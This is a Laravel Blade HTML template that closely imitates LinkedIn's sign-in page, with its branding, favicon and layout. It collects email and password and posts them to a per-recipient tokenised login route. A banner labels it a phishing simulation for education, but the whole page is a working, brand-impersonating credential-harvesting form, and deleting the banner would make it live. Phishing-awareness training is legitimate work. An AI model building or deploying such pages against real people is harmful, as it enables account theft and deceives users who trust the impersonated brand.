<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkedIn: Log In or Sign Up</title>
    <link rel="icon" href="https://static.licdn.com/sc/h/al2o9zrvru7aqj8e1x2rzsrca">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            background-color: #f3f2ef; 
            color: rgba(0,0,0,.9); 
            line-height: 1.5; 
        }
        .header { 
            background-color: #fff; 
            border-bottom: 1px solid #d6d6d6; 
            padding: 16px 0; 
        }
        .header-content { 
            max-width: 1128px; 
            margin: 0 auto; 
            padding: 0 24px; 
        }
        .logo { 
            color: #0a66c2; 
            font-size: 34px; 
            font-weight: 700; 
            text-decoration: none; 
        }
        .main { 
            max-width: 400px; 
            margin: 24px auto; 
            padding: 0 24px; 
        }
        .form-container { 
            background-color: #fff; 
            border-radius: 8px; 
            box-shadow: 0 4px 12px rgba(0,0,0,0.15); 
            padding: 24px; 
        }
        .form-title { 
            color: rgba(0,0,0,.9); 
            font-size: 32px; 
            font-weight: 400; 
            line-height: 1.25; 
            margin-bottom: 8px; 
        }
        .form-subtitle { 
            color: rgba(0,0,0,.6); 
            font-size: 16px; 
            margin-bottom: 24px; 
        }
        .form-group { 
            margin-bottom: 24px; 
        }
        .form-label { 
            color: rgba(0,0,0,.9); 
            font-size: 14px; 
            font-weight: 600; 
            line-height: 1.25; 
            margin-bottom: 4px; 
            display: block; 
        }
        .form-input { 
            background-color: #fff; 
            border: 1px solid rgba(0,0,0,.6); 
            border-radius: 4px; 
            color: rgba(0,0,0,.9); 
            font-size: 16px; 
            height: 52px; 
            padding: 12px; 
            width: 100%; 
            outline: none; 
        }
        .form-input:focus { 
            border-color: #0a66c2; 
            border-width: 2px; 
            padding: 11px; 
        }
        .forgot-password { 
            color: #0a66c2; 
            font-size: 16px; 
            font-weight: 600; 
            text-decoration: none; 
            margin-bottom: 16px; 
            display: inline-block; 
        }
        .forgot-password:hover { 
            text-decoration: underline; 
        }
        .signin-button { 
            background-color: #0a66c2; 
            border: none; 
            border-radius: 24px; 
            color: #fff; 
            cursor: pointer; 
            font-size: 16px; 
            font-weight: 600; 
            height: 48px; 
            width: 100%; 
            margin-bottom: 16px; 
        }
        .signin-button:hover { 
            background-color: #004182; 
        }
        .divider { 
            border-top: 1px solid rgba(0,0,0,.15); 
            margin: 24px 0; 
            position: relative; 
            text-align: center; 
        }
        .divider::before { 
            background-color: #fff; 
            color: rgba(0,0,0,.6); 
            content: 'or'; 
            font-size: 14px; 
            padding: 0 16px; 
            position: absolute; 
            top: -10px; 
            left: 50%; 
            transform: translateX(-50%); 
        }
        .google-signin { 
            border: 1px solid rgba(0,0,0,.6); 
            border-radius: 24px; 
            background-color: #fff; 
            color: rgba(0,0,0,.6); 
            cursor: pointer; 
            font-size: 16px; 
            font-weight: 600; 
            height: 48px; 
            width: 100%; 
            margin-bottom: 24px; 
        }
        .signup-link { 
            text-align: center; 
            margin-top: 24px; 
        }
        .signup-link a { 
            color: #0a66c2; 
            font-size: 16px; 
            font-weight: 600; 
            text-decoration: none; 
        }
        .disclaimer { 
            position: fixed; 
            bottom: 10px; 
            left: 50%; 
            transform: translateX(-50%); 
            background: rgba(255, 0, 0, 0.9); 
            color: white; 
            padding: 8px 16px; 
            border-radius: 4px; 
            font-size: 12px; 
            z-index: 1000; 
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <a href="#" class="logo">Linked<span style="background-color: #0a66c2; color: #fff; padding: 2px 4px; border-radius: 2px;">in</span></a>
        </div>
    </header>
    <main class="main">
        <div class="form-container">
            <h1 class="form-title">Sign in</h1>
            <p class="form-subtitle">Stay updated on your professional world</p>
            <form method="POST" action="{{ url('/login/' . $token) }}">
                @csrf
                <div class="form-group">
                    <label class="form-label">Email or Phone</label>
                    <input type="text" name="email" class="form-input" required>
                </div>
                <div class="form-group">
                    <label class="form-label">Password</label>
                    <input type="password" name="password" class="form-input" required>
                </div>
                <a href="#" class="forgot-password">Forgot password?</a>
                <button type="submit" class="signin-button">Sign in</button>
            </form>
            <div class="divider"></div>
            <button class="google-signin">Continue with Google</button>
            <div class="signup-link">
                New to LinkedIn? <a href="#">Join now</a>
            </div>
        </div>
    </main>
    <div class="disclaimer">
        ⚠️ This is a phishing simulation for educational purposes. Do not use real credentials.
    </div>
</body>
</html>
